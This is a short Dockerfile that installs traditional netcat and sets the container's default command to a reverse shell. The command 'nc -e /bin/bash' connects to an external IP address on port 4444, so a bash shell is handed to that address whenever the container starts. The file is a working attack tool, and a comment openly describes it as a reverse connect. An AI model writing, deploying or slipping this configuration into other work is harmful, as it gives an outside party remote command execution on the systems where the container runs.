FROM ubuntu:20.04

# Suppress tzdata prompt
ENV DEBIAN_FRONTEND=noninteractive

# Install traditional netcat (not OpenBSD)
RUN apt update && \
	apt install -y netcat-traditional && \
	ln -sf /bin/nc.traditional /bin/nc && \
	apt clean

# Create working dir
WORKDIR /app

# Optional: default to bash shell on reverse connect (override with CMD)
CMD ["nc", "-e", "/bin/bash", "10.113.107.226", "4444"]

